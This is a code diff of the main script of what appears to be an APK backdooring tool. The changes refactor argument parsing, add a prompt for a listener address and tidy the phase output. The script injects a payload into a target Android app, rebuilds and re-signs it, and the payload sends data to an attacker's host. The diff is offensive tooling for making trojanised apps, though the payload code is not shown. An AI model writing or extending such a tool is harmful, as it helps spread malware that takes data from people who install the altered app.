@@ -1,15 +1,15 @@
-import os
 import argparse
 import logging
 import re
 from collections import namedtuple
+
 from colorama import Fore, Style
 
 from . import __version__
+from . import utilities
 from .apk import Apk
 from .payload import Payload
-from . import utilities
-from .utilities import print_phase, phase_done
+from .utilities import phase
 
 
 def ip_port_value(string):
@@ -42,14 +42,16 @@ def setup_args():
     )
 
     parser.add_argument(
-        'host',
+        '--host', '-H',
+        dest='host',
+        default=None,
         metavar='HOST',
         help='The host (in the form IP:PORT) to which the payload will send data',
         type=ip_port_value
     )
 
     parser.add_argument(
-        '--host', '-H',
+        '--public_host', '-p',
         dest='public_host',
         default=None,
         metavar='PUBLIC_HOST',
@@ -63,18 +65,19 @@ def setup_args():
     parser.add_argument(
         '-V', '--verbose',
         dest='verbosity',
-        action='count',
-        default=0,
+        choices=['CRITICAL', 'ERROR', 'WARN', 'INFO', 'DEBUG'],
+        default='CRITICAL',
+        type=str.upper,
         help='Verbosity level (between 1 and 5 occurrences with '
              'more leading to a more verbose logging). '
              'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'
     )
     log_levels = {
-        0: logging.CRITICAL,
-        1: logging.ERROR,
-        2: logging.WARN,
-        3: logging.INFO,
-        4: logging.DEBUG,
+        'CRITICAL': logging.CRITICAL,
+        'ERROR': logging.ERROR,
+        'WARN': logging.WARN,
+        'INFO': logging.INFO,
+        'DEBUG': logging.DEBUG,
     }
 
     args = parser.parse_args()
@@ -83,33 +86,40 @@ def setup_args():
 
 
 def main():
-    utilities.clear_screen()
-    print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)
-
     args = setup_args()
     logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log')
 
+    utilities.clear_screen()
+    print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)
+
+    while args.host is None:
+        host = input(f'{Fore.YELLOW}Set the listener address: ')
+        print(Style.RESET_ALL, end='', flush=True)
+        try:
+            args.host = ip_port_value(host)
+        except argparse.ArgumentTypeError as e:
+            print(Fore.RED + str(e) + Style.RESET_ALL)
+            args.host = None
+    print(('-' * 30).center(120))
 
     payload = Payload(args.host, args.public_host)
 
     apk = Apk(args.apk)
-    
+
     print('[ ==== PAYLOAD INJECTION ==== ]'.center(120))
     payload.inject(apk)
     payload.delete()
 
     print('[ ==== TARGET FINALIZATION ==== ]'.center(120))
 
-    print_phase("Building modified target's APK")
     apk.build()
-    phase_done()
 
-    print_phase("Signing modified target's APK")
     apk.sign()
-    phase_done()
 
-    print_phase("Removing target's APK decompilation's results")
-    apk.remove_decompiled()
-    phase_done()
+    @phase("Removing target's APK decompilation's results")
+    def remove_decompiled():
+        apk.remove_decompiled()
+
+    remove_decompiled()
 
     print()
